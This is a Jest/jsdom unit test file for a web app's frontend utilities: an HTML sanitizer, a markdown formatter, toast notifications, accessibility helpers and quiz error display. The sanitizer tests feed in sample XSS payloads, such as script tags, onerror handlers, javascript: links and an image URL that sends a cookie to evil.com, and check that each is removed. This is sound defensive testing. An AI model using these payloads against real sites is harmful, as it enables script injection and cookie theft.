/**
 * @jest-environment jsdom
 */

/**
 * Frontend Unit Tests
 * Tests for client-side utility functions and modules
 * Uses jsdom environment for browser API simulation
 */
describe('Frontend Utilities', () => {
  describe('Chat.sanitizeHTML', () => {
    // Simulate the sanitizer from chat.js
    const sanitizeHTML = (html) => {
      const temp = document.createElement('div');
      temp.innerHTML = html;

      const dangerous = temp.querySelectorAll('script,style,iframe,object,embed,form,link,meta');
      dangerous.forEach((el) => el.remove());

      temp.querySelectorAll('*').forEach((el) => {
        for (const attr of Array.from(el.attributes)) {
          if (attr.name.startsWith('on') || attr.name === 'srcdoc' || attr.name === 'src') {
            el.removeAttribute(attr.name);
          }
          if (attr.name === 'href' && attr.value.trim().toLowerCase().startsWith('javascript:')) {
            el.removeAttribute(attr.name);
          }
        }
      });

      return temp.innerHTML;
    };

    it('should allow safe HTML tags', () => {
      const input = '<p>Hello <strong>world</strong></p>';
      expect(sanitizeHTML(input)).toBe('<p>Hello <strong>world</strong></p>');
    });

    it('should strip <script> tags', () => {
      const input = '<p>Hello</p><script>alert("xss")</script>';
      expect(sanitizeHTML(input)).toBe('<p>Hello</p>');
    });

    it('should strip <iframe> tags', () => {
      const input = '<p>Content</p><iframe src="evil.com"></iframe>';
      expect(sanitizeHTML(input)).toBe('<p>Content</p>');
    });

    it('should strip <style> tags', () => {
      const input = '<style>body { display: none }</style><p>Text</p>';
      expect(sanitizeHTML(input)).toBe('<p>Text</p>');
    });

    it('should strip onclick attributes', () => {
      const input = '<button onclick="alert(1)">Click</button>';
      const result = sanitizeHTML(input);
      expect(result).not.toContain('onclick');
    });

    it('should strip onerror attributes', () => {
      const input = '<img onerror="alert(1)" />';
      const result = sanitizeHTML(input);
      expect(result).not.toContain('onerror');
    });

    it('should strip javascript: hrefs', () => {
      const input = '<a href="javascript:alert(1)">Click</a>';
      const result = sanitizeHTML(input);
      expect(result).not.toContain('javascript:');
    });

    it('should strip src attributes to prevent data exfiltration', () => {
      const input = '<img src="https://evil.com/steal?cookie=123" />';
      const result = sanitizeHTML(input);
      expect(result).not.toContain('src=');
    });

    it('should preserve list structures', () => {
      const input = '<ul><li>First</li><li>Second</li></ul>';
      expect(sanitizeHTML(input)).toBe('<ul><li>First</li><li>Second</li></ul>');
    });

    it('should preserve headings', () => {
      const input = '<h2>Title</h2><h3>Subtitle</h3>';
      expect(sanitizeHTML(input)).toBe('<h2>Title</h2><h3>Subtitle</h3>');
    });
  });

  describe('Markdown Formatter', () => {
    const formatMarkdown = (text) => {
      if (!text) return '';

      return text
        .replace(/^### (.*$)/gm, '<h3>$1</h3>')
        .replace(/^## (.*$)/gm, '<h2>$1</h2>')
        .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
        .replace(/\*(.*?)\*/g, '<em>$1</em>')
        .replace(/`(.*?)`/g, '<code>$1</code>')
        .replace(/^\- (.*$)/gm, '<li>$1</li>')
        .replace(/^\* (.*$)/gm, '<li>$1</li>')
        .replace(/^\d+\. (.*$)/gm, '<li>$1</li>')
        .replace(/((<li>.*<\/li>\n?)+)/g, '<ul>$1</ul>')
        .split('\n\n')
        .map((para) => {
          para = para.trim();
          if (!para) return '';
          if (para.startsWith('<h') || para.startsWith('<ul') || para.startsWith('<ol') || para.startsWith('<li')) {
            return para;
          }
          return `<p>${para}</p>`;
        })
        .join('');
    };

    it('should return empty string for null input', () => {
      expect(formatMarkdown(null)).toBe('');
      expect(formatMarkdown('')).toBe('');
    });

    it('should convert **bold** to <strong>', () => {
      const result = formatMarkdown('This is **bold** text');
      expect(result).toContain('<strong>bold</strong>');
    });

    it('should convert *italic* to <em>', () => {
      const result = formatMarkdown('This is *italic* text');
      expect(result).toContain('<em>italic</em>');
    });

    it('should convert ### heading to <h3>', () => {
      const result = formatMarkdown('### My Heading');
      expect(result).toContain('<h3>My Heading</h3>');
    });

    it('should convert inline `code` to <code>', () => {
      const result = formatMarkdown('Use `npm install` to install');
      expect(result).toContain('<code>npm install</code>');
    });

    it('should wrap plain text in <p> tags', () => {
      const result = formatMarkdown('Hello world');
      expect(result).toBe('<p>Hello world</p>');
    });
  });

  describe('Toast Notification', () => {
    beforeEach(() => {
      document.body.innerHTML = '';
    });

    it('should create a toast element when showToast is called', () => {
      // Simulate showToast function
      const toast = document.createElement('div');
      toast.className = 'toast-notification toast-error';
      toast.setAttribute('role', 'alert');
      toast.setAttribute('aria-live', 'assertive');
      toast.textContent = 'Test error message';
      document.body.appendChild(toast);

      const toastEl = document.querySelector('.toast-notification');
      expect(toastEl).not.toBeNull();
      expect(toastEl.textContent).toBe('Test error message');
      expect(toastEl.getAttribute('role')).toBe('alert');
    });
  });

  describe('Accessibility Helpers', () => {
    beforeEach(() => {
      document.body.innerHTML = '<div id="sr-announcer" aria-live="polite" class="sr-only"></div>';
    });

    it('should announce messages to screen readers', () => {
      const announcer = document.getElementById('sr-announcer');
      announcer.textContent = 'Quiz complete. You scored 5 out of 5.';
      expect(announcer.textContent).toContain('Quiz complete');
      expect(announcer.getAttribute('aria-live')).toBe('polite');
    });

    it('should have sr-only class for visual hiding', () => {
      const announcer = document.getElementById('sr-announcer');
      expect(announcer.classList.contains('sr-only')).toBe(true);
    });
  });

  describe('Quiz Error Display', () => {
    beforeEach(() => {
      document.body.innerHTML = '<div id="quiz-controls" style="display:flex"></div>';
    });

    it('should create inline error message element', () => {
      const controls = document.getElementById('quiz-controls');
      const errorDiv = document.createElement('div');
      errorDiv.className = 'quiz-error-msg';
      errorDiv.setAttribute('role', 'alert');
      errorDiv.textContent = 'Please answer all questions';
      controls.prepend(errorDiv);

      const msg = controls.querySelector('.quiz-error-msg');
      expect(msg).not.toBeNull();
      expect(msg.getAttribute('role')).toBe('alert');
      expect(msg.textContent).toBe('Please answer all questions');
    });

    it('should remove previous errors before adding new ones', () => {
      const controls = document.getElementById('quiz-controls');

      // Add first error
      const error1 = document.createElement('div');
      error1.className = 'quiz-error-msg';
      error1.textContent = 'Error 1';
      controls.prepend(error1);

      // Simulate removing existing before adding new
      const existing = controls.querySelector('.quiz-error-msg');
      if (existing) existing.remove();

      const error2 = document.createElement('div');
      error2.className = 'quiz-error-msg';
      error2.textContent = 'Error 2';
      controls.prepend(error2);

      const errors = controls.querySelectorAll('.quiz-error-msg');
      expect(errors.length).toBe(1);
      expect(errors[0].textContent).toBe('Error 2');
    });
  });
});
